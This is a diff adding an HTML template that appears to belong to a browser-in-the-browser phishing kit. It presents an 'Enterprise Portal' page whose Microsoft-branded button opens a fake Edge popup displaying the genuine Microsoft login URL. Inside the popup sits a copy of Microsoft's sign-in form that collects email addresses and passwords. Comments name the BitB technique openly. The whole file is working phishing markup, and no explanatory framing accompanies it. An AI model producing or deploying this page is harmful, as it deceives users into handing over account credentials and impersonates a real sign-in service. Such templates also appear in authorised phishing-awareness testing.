@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="../lib/bitb.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .main-container {
+            text-align: center;
+            color: white;
+            padding: 40px;
+        }
+
+        h1 {
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 16px;
+        }
+
+        p {
+            font-size: 18px;
+            margin-bottom: 32px;
+            opacity: 0.9;
+        }
+
+        .microsoft-signin-btn {
+            display: inline-flex;
+            align-items: center;
+            background: white;
+            color: #5e5e5e;
+            padding: 12px 24px;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid #8c8c8c;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            transition: background-color 0.2s;
+        }
+
+        .microsoft-signin-btn:hover {
+            background: #f3f2f1;
+        }
+
+        .microsoft-icon {
+            width: 21px;
+            height: 21px;
+            margin-right: 12px;
+        }
+
+        /* Hidden OAuth Content */
+        #microsoft-oauth-content {
+            display: none;
+        }
+
+        .oauth-container {
+            background: white;
+            padding: 44px 44px 36px;
+            text-align: center;
+        }
+
+        .oauth-logo {
+            margin-bottom: 16px;
+        }
+
+        .oauth-title {
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .oauth-form {
+            text-align: left;
+            margin-top: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px 12px;
+            font-size: 15px;
+            border: 1px solid #8c8c8c;
+            background: #fff;
+            color: #1b1b1b;
+            box-sizing: border-box;
+        }
+
+        input:hover {
+            border-color: #1b1b1b;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            border-width: 2px;
+            padding: 7px 11px;
+        }
+
+        .checkbox-group {
+            margin: 24px 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-group input {
+            margin-right: 8px;
+        }
+
+        .checkbox-group label {
+            font-size: 15px;
+            margin: 0;
+        }
+
+        .oauth-button {
+            width: 100%;
+            padding: 8px 12px;
+            font-size: 15px;
+            font-weight: 600;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        .oauth-button:hover {
+            background-color: #005a9e;
+        }
+
+        .oauth-footer {
+            margin-top: 16px;
+            font-size: 13px;
+        }
+
+        .oauth-footer a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .oauth-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 24px 0;
+            text-align: center;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e1e1e1;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 16px;
+            position: relative;
+            font-size: 13px;
+            color: #605e5c;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <h1>Enterprise Portal</h1>
+        <p>Sign in with your Microsoft account to access resources</p>
+
+        <!-- Trigger Button for BitB -->
+        <button
+            class="microsoft-signin-btn"
+            data-bitb-trigger
+            data-bitb-title="Sign in to your Microsoft account"
+            data-bitb-url="https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+            data-bitb-width="440"
+            data-bitb-height="580"
+            data-bitb-browser="edge"
+            data-bitb-content="microsoft-oauth-content">
+            <svg class="microsoft-icon" viewBox="0 0 21 21">
+                <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+                <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+                <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+                <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+            </svg>
+            Sign in with Microsoft
+        </button>
+    </div>
+
+    <!-- Hidden BitB Content -->
+    <div id="microsoft-oauth-content">
+        <div class="oauth-container">
+            <div class="oauth-logo">
+                <svg width="108" height="24" viewBox="0 0 108 24">
+                    <rect width="11" height="11" fill="#F25022"/>
+                    <rect x="13" width="11" height="11" fill="#7FBA00"/>
+                    <rect y="13" width="11" height="11" fill="#00A4EF"/>
+                    <rect x="13" y="13" width="11" height="11" fill="#FFB900"/>
+                </svg>
+            </div>
+
+            <h2 class="oauth-title">Sign in</h2>
+
+            <form class="oauth-form" method="POST" action="">
+                <div class="form-group">
+                    <label for="email">Email, phone, or Skype</label>
+                    <input type="text" id="email" name="email" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <a href="#" style="color: #0067b8; text-decoration: none; font-size: 13px;">Can't access your account?</a>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <div class="form-group">
+                    <a href="#" style="color: #0067b8; text-decoration: none; font-size: 13px;">Forgot password?</a>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="keep-signed-in" name="keepSignedIn">
+                    <label for="keep-signed-in">Keep me signed in</label>
+                </div>
+
+                <button type="submit" class="oauth-button">Sign in</button>
+
+                <div class="divider">
+                    <span>or</span>
+                </div>
+
+                <div class="oauth-footer">
+                    <a href="#">Sign-in options</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="../lib/bitb.js"></script>
+</body>
+</html>
